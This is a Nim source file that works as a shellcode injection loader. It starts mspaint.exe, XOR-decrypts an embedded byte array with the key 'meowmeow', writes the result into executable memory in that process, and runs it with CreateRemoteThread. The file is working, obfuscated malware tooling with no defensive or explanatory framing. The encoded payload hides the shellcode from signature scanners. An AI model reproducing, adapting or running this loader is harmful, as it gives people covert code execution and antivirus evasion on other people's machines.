import osproc
import winim

proc xorEnc(data: seq[byte], key: seq[byte]): seq[byte] =
    var enc: seq[byte]
    for i in 0 ..< len(data):
        enc.add(data[i] xor key[i mod len(key)])
    result = enc

let process = startProcess("mspaint.exe")
echo "started  process: ", process.processID

let ph = winim.OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](process.processID)
)

let mykey: seq[byte] = @[0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77]
let encrypted: seq[byte] = @[
0x91, 0x2D, 0xEE, 0x93, 0x9D, 0x9A, 0x90, 
0x88, 0x85, 0xB5, 0x6F, 0x77, 0x6D, 0x24, 0x3E, 0x36, 0x3D, 0x37, 0x3E, 
0x21, 0x25, 0x54, 0xBD, 0x12, 0x25, 0xEE, 0x3D, 0x17, 0x53, 0x2D, 0xE4, 
0x25, 0x75, 0x5B, 0x27, 0xFC, 0x3F, 0x45, 0x51, 0x3F, 0xE6, 0x17, 0x3F, 
0x49, 0x25, 0x6A, 0xD8, 0x3D, 0x27, 0x28, 0x5E, 0xBE, 0x25, 0x54, 0xAF, 
0xDB, 0x51, 0x04, 0x13, 0x75, 0x41, 0x45, 0x2E, 0xB6, 0xA4, 0x68, 0x2E, 
0x76, 0xAC, 0x87, 0x82, 0x25, 0x2C, 0x34, 0x51, 0x3F, 0xE6, 0x37, 0x4F, 
0x49, 0xE6, 0x27, 0x53, 0x3F, 0x6C, 0xB5, 0x51, 0xFC, 0xED, 0xED, 0x6F, 
0x77, 0x6D, 0x2D, 0xEA, 0xB7, 0x19, 0x0A, 0x27, 0x76, 0xBD, 0x35, 0x51, 
0xFC, 0x25, 0x7D, 0x51, 0x33, 0xE6, 0x25, 0x4F, 0x3E, 0x6C, 0xB5, 0x8C, 
0x2B, 0x25, 0x9A, 0xA6, 0x49, 0x2C, 0xEE, 0x5B, 0xFF, 0x25, 0x64, 0xB9, 
0x3A, 0x5C, 0xAC, 0x27, 0x46, 0xAD, 0xC9, 0x2E, 0xB6, 0xA4, 0x68, 0x2E, 
0x76, 0xAC, 0x5D, 0x8F, 0x02, 0x9C, 0x5B, 0x23, 0x74, 0x21, 0x41, 0x67, 
0x32, 0x54, 0xB4, 0x1A, 0xA1, 0x35, 0x5B, 0x2B, 0xFC, 0x2D, 0x41, 0x26, 
0x76, 0xBD, 0x03, 0x51, 0x36, 0xE6, 0x69, 0x27, 0x49, 0x29, 0xEE, 0x2F, 
0x6B, 0x24, 0x64, 0xBF, 0x49, 0x2C, 0xEE, 0x6B, 0xFF, 0x25, 0x64, 0xBF, 
0x36, 0x35, 0x24, 0x37, 0x29, 0x34, 0x3F, 0x2E, 0x2F, 0x2C, 0x3C, 0x2E, 
0x2D, 0x25, 0xE6, 0x83, 0x57, 0x2C, 0x37, 0x90, 0x97, 0x35, 0x24, 0x36, 
0x2D, 0x53, 0x2D, 0xE4, 0x65, 0x84, 0x2C, 0x90, 0x88, 0x92, 0x38, 0x26, 
0xB0, 0xAC, 0x65, 0x6F, 0x77, 0x6D, 0x5B, 0x27, 0xFA, 0xF8, 0x9B, 0x6F, 
0x77, 0x6D, 0x5B, 0x23, 0xFA, 0xE8, 0x6C, 0x6E, 0x77, 0x6D, 0x2D, 0x5E, 
0xBE, 0x2C, 0xDF, 0x2A, 0xF4, 0x3B, 0x62, 0x90, 0xA2, 0x25, 0x54, 0xA6, 
0x36, 0xD7, 0x95, 0xDA, 0xD5, 0x3B, 0x9A, 0xBA, 0x1A, 0x08, 0x0A, 0x18, 
0x5A, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x65, 0x0C, 0x16, 0x19, 0x65]

when isMainModule:
    let payload = xorEnc(encrypted, mykey)
    let mem = VirtualAllocEx(
        ph,
        NULL,
        cast[SIZE_T](encrypted.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
    var btw: SIZE_T
    let wp = WriteProcessMemory(
        ph,
        mem,
        unsafeAddr payload[0],
        cast[SIZE_T](encrypted.len),
        addr btw
    )
    echo "writeprocessmemory: ", bool(wp)
    let th = CreateRemoteThread(
        ph,
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](mem),
        NULL,
        0,
        NULL
    )
    echo "successfully inject to process: ", process.processID
    echo "thread Handle: ", th
